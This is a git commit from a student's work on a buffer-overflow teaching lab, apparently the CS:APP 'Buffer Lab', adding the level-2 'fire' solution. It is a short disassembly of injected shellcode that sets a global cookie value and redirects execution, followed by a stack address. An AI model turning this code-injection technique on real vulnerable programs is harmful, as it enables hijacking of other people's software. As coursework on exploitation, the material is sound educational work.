de7347463d9acb28f658678f6b20eb47f08987f6
Dong Yuan <doffery20@gmail.com>
2014-09-16 03:39:06 +0800

    level 2, to be continue

---
+++ 3.Buffer Lab/buflab-handout/fire.d
@@ -0,0 +1,13 @@
+
+fire.o:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 <.text>:
+   0:	c7 05 ec c1 04 08 81 	movl   $0x506fdc81,0x804c1ec
+   7:	dc 6f 50 
+   a:	68 eb 8c 04 08       	push   $0x8048ceb
+   f:	c3                   	ret    
+
+0x55683558
